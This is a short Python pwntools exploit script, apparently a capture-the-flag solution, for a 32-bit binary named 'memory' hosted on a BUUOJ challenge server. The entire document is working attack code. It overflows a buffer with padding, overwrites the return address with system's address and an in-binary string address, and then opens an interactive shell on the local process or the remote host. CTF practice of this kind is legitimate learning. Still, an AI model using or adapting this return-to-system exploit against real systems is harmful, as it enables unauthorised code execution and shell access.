#!/usr/bin/python3
import sys
from pwn import *
# context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./memory')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./memory')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',26389)
			elf=ELF('./memory')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')


		pay=b'a'*7+b'\x00'*0x10+p32(elf.sym[b'system'])
		pay+=p32(0x080487e0)+p32(0x80487e0)
		#io.recv()
		# gdb.attach(io)
		io.sendline(pay)
		io.recv()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue